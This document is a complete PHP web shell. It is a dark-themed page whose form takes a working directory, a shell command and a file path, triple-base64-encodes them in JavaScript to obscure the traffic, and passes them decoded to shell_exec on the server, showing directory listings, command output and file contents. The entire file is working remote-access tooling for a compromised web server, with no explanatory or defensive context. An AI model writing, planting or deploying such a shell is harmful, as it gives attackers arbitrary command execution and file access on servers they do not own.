<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <title><?php echo $_SERVER['PHP_SELF']; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  width:99%;
  height:auto;
  min-height: 600px;
  margin: 20px 5px;
  background: black;
  border: 1px solid white;
  font: 16px arial;
  color: #ffffff;
}

div {
  border: 1px solid white;
  width: auto;
  min-height: 1.1em;
  margin: 7px;
}

p {
  line-height: 1.1;
  width: 95%;
  margin 0 0 0 0;
  padding: 0 0 0 0;
}

.containH {
  display: flex;
  flex-flow: row nowrap;
}
.containH div:nth-child(1) {
  display: flex;
  flex-flow: column nowrap;
  flex: 1 1 auto;
  width: 80%;
  justify-content: flex-end;
  align-items: flex-end;
}
.containH div input{
  width:  95%;;
  align-items: flex-end;
}
.containH div input{
  width: auto%;

  margin: auto;
  font-family: "Courier New", Courier, monospace;
}
.containH div:nth-child(2) {
  display: flex;
  flex: 1 1 auto;
  width: 20%;
  height: auto;
  justify-content: center;
  align-items: center;
}
pre {
  font-size: 13px;
  font-family: "Courier New", Courier, monospace;
}

.top_pane {
  overflow: auto;
  height: 200px;
  width:  98%;
  border: 1px solid white;
}
.bottom_pane {
  overflow: auto;
  height: 800px;
  width:  98%;
  border: 1px solid white;
}

textarea {
  background-color: black;
  color: white;
  font-size: 13px;
  font-family: "Courier New", Courier, monospace;
}
</style>
<script type="text/javascript">
function convert(){
  document.getElementsByName("wd")[0].value = btoa(btoa(btoa(document.getElementsByName("wd")[0].value))); 
  document.getElementsByName("rc")[0].value = btoa(btoa(btoa(document.getElementsByName("rc")[0].value))); 
  document.getElementsByName("cf")[0].value = btoa(btoa(btoa(document.getElementsByName("cf")[0].value))); 
}
</script>
</head>
<body>
<form onsubmit="convert();" action="<?php echo $_SERVER['PHP_SELF']; ?>" method='POST'>
    <div class="containH"> 
    <div>
        <p>Working dir: <input type="text" name="wd" value="<?php echo htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd]))));?>"></p>
        <p>Command: <input type="text" name="rc" value=""></p>
        <p>cat file: <input type="text" name="cf" value=""></p>
    </div> 
    <div>
        <center><input type='submit' value='Submit'></center>
    </div>
    </div>
    <pre><center><textarea class="top_pane">
        <?php echo "\n" . "Working dir: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd])))) . "\n" . "Command: " . "ls -al ." . "\n\n"; ?>
        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";" . "ls -al"); ?>
    </textarea></center></pre>
    <pre><center><textarea class="bottom_pane">
        <?php echo "\n" . "Working dir: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd])))) . "\n" . "Command: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[rc])))) . "\n" . "cat file: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[cf])))) . "\n\n"; ?>
        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";" . base64_decode(base64_decode(base64_decode($_POST["rc"])))); ?>
        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";cat " . base64_decode(base64_decode(base64_decode($_POST[cf])))); ?>
    </textarea></center></pre>
</form>
</body>
</html>

